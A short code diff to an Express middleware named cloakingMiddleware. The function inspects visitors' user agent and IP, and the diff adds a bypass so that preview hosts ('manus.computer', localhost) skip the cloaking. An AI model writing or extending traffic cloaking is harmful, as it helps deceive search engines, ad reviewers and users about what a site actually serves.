@@ -385,6 +385,11 @@ export function cloakingMiddleware(req: Request, res: Response, next: NextFuncti
   if (req.path.startsWith("/api/") || req.path.startsWith("/manus-storage/") || req.path.startsWith("/__manus__/") || req.path.startsWith("/socket.io") || req.path.startsWith("/r/")) {
     return next();
   }
+  // Bypass cloaking for Manus preview environment
+  const host = req.headers.host || "";
+  if (host.includes("manus.computer") || host.includes("localhost") || host.includes("127.0.0.1")) {
+    return next();
+  }
   
   const ua = (req.headers["user-agent"] || "") as string;
   const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket?.remoteAddress || "";
